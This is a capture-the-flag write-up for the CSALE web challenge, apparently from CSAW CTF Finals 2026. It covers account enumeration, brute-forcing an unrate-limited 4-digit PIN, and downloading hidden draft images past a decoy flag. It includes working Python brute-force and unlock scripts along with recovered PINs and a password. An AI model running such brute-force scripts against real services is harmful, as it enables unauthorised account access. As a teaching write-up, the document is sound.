# CSALE

| Event | Category | Flag format | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Web | `csawctf{...}` (last year's format, not `csaw{}`) | `csawctf{REDACTED}` |

**TL;DR** — A Flask storefront that had to be solved black-box, because the source release was
pulled as "inaccurate". The path itself is short: enumerate seller accounts, brute-force an
unrate-limited 4-digit PIN, download the flag account's unlisted draft images. The real
difficulty is a deliberate **two-layer decoy** that burns your time on a near-invisible fake flag
while the real one sits in plain handwriting in a second image.

> **Flag redaction.** This writeup was originally published with the flag redacted and no local
> copy of the real value survives, so `csawctf{REDACTED}` is kept here rather than invented.
> Everything else is the live solve.

---

## 1. Recon

A typical Flask store with public listings and seller accounts. With no source available,
everything had to come from the live instance.

What black-box probing established:

- Seller accounts are enumerable.
- Each account has an "unlisted" section gated by a 4-digit PIN.
- One account is clearly the target: `superdiscreetflaguser`.
- The listing/draft images belonging to that account carry the flag.

Accounts found during recon:

```
Walter_W
Zoro
OSIRIS
Zuko
superdiscreetflaguser
```

> **Spelling matters.** The original CSALE instance uses **discreet**; the Revenge instance uses
> **discrete**. Hardcoding the wrong one silently finds nothing.

---

## 2. Brute-forcing the PIN

The unlisted section is protected by four digits — a 10,000 key space — with **no rate limiting,
no lockout and no CAPTCHA**. That is exhaustible in seconds with a thread pool.

```
POST /account/unlisted/unlock
pin=XXXX
```

A correct PIN returns a redirect or success; a wrong PIN returns HTTP 403, so the oracle is just
`status_code != 403`.

```python
#!/usr/bin/env python3
# brute_pin.py — exhaust the 4-digit unlisted-section PIN.
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://<target>:5000"
USER = "superdiscreetflaguser"
PASSWORD = "password123"

s = requests.Session()
s.post(f"{BASE}/login", data={"username": USER, "password": PASSWORD}, timeout=15)
cookie = {"session": s.cookies.get("session")}

def try_pin(n):
    r = requests.post(
        f"{BASE}/account/unlisted/unlock",
        data={"pin": f"{n:04d}"},
        cookies=cookie,
        timeout=20,
        allow_redirects=False,
    )
    return f"{n:04d}" if r.status_code != 403 else None

with ThreadPoolExecutor(max_workers=64) as ex:
    futures = [ex.submit(try_pin, i) for i in range(10000)]
    for f in as_completed(futures):
        pin = f.result()
        if pin:
            print(f"[+] PIN found: {pin}")
            break
```

PINs recovered on the live instance:

| Account | PIN |
|---|---|
| Walter_W | 3276 |
| Zoro | 7800 |
| OSIRIS | 9898 |
| Zuko | 0540 |
| superdiscreetflaguser | 9837 |

---

## 3. Unlock and pull the draft images

After logging in as `superdiscreetflaguser` and POSTing the correct PIN, the unlisted drafts
become visible. The page references draft images that are never shown as public thumbnails.

```python
#!/usr/bin/env python3
# fetch_drafts.py — unlock the unlisted section and download every draft image.
import re, requests

BASE = "http://<target>:5000"
s = requests.Session()
s.post(f"{BASE}/login",
       data={"username": "superdiscreetflaguser", "password": "password123"}, timeout=15)

r = s.post(f"{BASE}/account/unlisted/unlock", data={"pin": "9837"},
           timeout=15, allow_redirects=False)
print("unlock:", r.status_code)

r = s.get(f"{BASE}/account/unlisted", timeout=20)
image_paths = set(re.findall(r'src="(/account/unlisted/\d+/image)"', r.text))
print("images:", image_paths)

for p in image_paths:
    rr = s.get(BASE + p, timeout=30)
    fn = p.replace("/", "_") + ".png"
    open(fn, "wb").write(rr.content)
    print(f"saved {fn}: {len(rr.content)} bytes")
```

---

## 4. The two-layer trap

### Layer 1 — the decoy

`flag_img.png` contains text rendered at **extremely low contrast**: grey on orange, roughly
20 RGB levels apart. It is invisible at normal viewing. Recovering it takes per-channel
separation, contrast stretching, and connected-component analysis to segment the glyphs — a
genuinely satisfying piece of work that produces something flag-shaped:

```
csawctf{REDACTED_DECOY}
```

The same image also carries large handwritten text above and below that line:

> *do not submit this as flag / you will be banned*

The entire extraction exercise is the trap. The difficulty of the extraction is exactly what
makes it convincing.

### Layer 2 — the real flag

The actual flag is in a second image, `flag_v2.png`: plain black handwriting across the top of a
Zuko/Aang panel from *Avatar*. No extraction technique at all — it is legible the moment you look
at the right asset.

---

## 5. Solver

[`solve.py`](solve.py) performs the full chain: login, PIN brute force, image download.

---

## Flag

```
csawctf{REDACTED}
```

The real flag is in `flag_v2.png`; `flag_img.png` is the decoy.

---

## Takeaways

- **When a recovered flag is rejected, question the asset before the technique.** Hours went into
  extracting layer 1 correctly — and the extraction *was* correct. It was simply the wrong file.
- **Unrate-limited 4-digit PINs are not authentication.** 10,000 requests across 64 threads is
  under a minute.
- **A pulled source release is a hint, not a blocker.** Black-box enumeration recovered the whole
  attack surface here.
- Download *every* asset an account exposes before starting analysis on any single one.

## Files

- [`solve.py`](solve.py) — full solver: login, PIN brute force, image download.
- [`brute_pin.py`](brute_pin.py) — the single-account PIN brute-forcer from step 2.
- [`fetch_drafts.py`](fetch_drafts.py) — the unlock-and-download step.
- [`brute_new.py`](brute_new.py) — multi-account PIN brute-forcer used during the live solve.
